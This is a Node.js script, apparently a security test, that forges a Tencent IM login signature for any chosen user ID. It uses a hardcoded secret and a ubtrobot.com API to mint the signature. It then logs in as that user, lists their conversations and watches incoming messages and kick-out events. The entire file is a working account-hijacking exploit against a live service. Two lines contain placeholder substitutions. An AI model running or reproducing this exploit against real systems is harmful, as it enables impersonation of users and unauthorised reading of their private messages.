// im_hijack_test.js — 伪造指定 userId 的 userSig 登录腾讯 IM 并观察会话/被踢情况
// 用法: node im_hijack_test.js <userId> [停留秒数]
global.window = global;
global.navigator = { userAgent: 'node' };
global.addEventListener = global.addEventListener || (() => {});
global.removeEventListener = global.removeEventListener || (() => {});
global.XMLHttpRequest = require('xhr2');
if (typeof global.WebSocket === 'undefined') global.WebSocket = require('ws');
const TIM = require('tim-js-sdk');
const https = require('https');
const crypto = require('crypto');

const SDKAPPID = 1400032988;

function mintUserSig(userId) {
  return new Promise((resolve, reject) => {
    const t = Date.now().toString();
    const sig = crypto.createHash('md5').update('IM$SeCrET' + t).digest('hex');
    const qs = `signature=${sig}&time=${t}&userId=${encodeURIComponent(userId)}&channel=MINIEDUCN`;
    https.get(`https://apis.ubtrobot.com/im/getInfo?${qs}`, res => {
      let b = '';
      res.on('data', d => b += d);
      res.on('end', () => {
        try {
          const j = JSON.parse(b);
          if (j.returnCode === '0' && j.returnMap && j.returnMap.userSig) resolve(j.returnMap.userSig);
          else reject(new Error('getInfo failed: ' + b.slice(0, 200)));
        } catch (e) { reject(e); }
      });
    }).on('error', reject);
  });
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

(async () => {
  const userId = <账户_01>.argv[2];
  const staySecs = parseInt(process.argv[3] || '20', 10);
  if (!userId) { console.error('usage: node im_hijack_test.js <userId> [secs]'); process.exit(1); }

  const userSig = await mintUserSig(userId);
  console.log('[*] 已为', userId, '伪造 userSig:', userSig.slice(0, 50) + '...');

  const tim = TIM.create({ SDKAppID: SDKAPPID });
  tim.setLogLevel(0);

  let readyResolve;
  const ready = new Promise(r => readyResolve = r);
  tim.on(TIM.EVENT.SDK_READY, () => { console.log('[+] SDK_READY'); readyResolve(); });
  tim.on(TIM.EVENT.KICKED_OUT, e => {
    console.log('[!] KICKED_OUT 被踢! type =', JSON.stringify(e.data));
  });
  tim.on(TIM.EVENT.MESSAGE_RECEIVED, e => {
    e.data.forEach(m => console.log('[msg] 收到消息 from', m.from, 'type', m.type));
  });
  tim.on(TIM.EVENT.SDK_NOT_READY, () => console.log('[i] SDK_NOT_READY'));
  tim.on(TIM.EVENT.NET_STATE_CHANGE, e => console.log('[i] NET_STATE:', e.state));

  const res = await tim.login({ userID: <账户_01>, userSig });
  console.log('[+] 登录成功 actionStatus=', res.data.actionStatus, ' tinyID=', res.data.tinyID);

  await Promise.race([ready, sleep(15000)]);
  try {
    const conv = await tim.getConversationList();
    const list = conv.data.conversationList;
    console.log('[+] 会话列表', list.length, '个:');
    list.slice(0, 20).forEach(c => {
      const lm = c.lastMessage || {};
      console.log('    -', c.conversationID, '| lastTime:', lm.lastTime || '', '| from:', lm.fromAccount || '');
    });
  } catch (e) { console.log('[i] 拉会话失败:', e.message); }

  console.log(`[*] 停留 ${staySecs}s 观察事件（被踢/收消息）...`);
  await sleep(staySecs * 1000);
  try { await tim.logout(); console.log('[+] 已登出'); } catch (e) { console.log('[i] 登出异常:', e.message); }
  process.exit(0);
})().catch(e => { console.error('[-] 失败:', e.code || '', e.message); process.exit(2); });
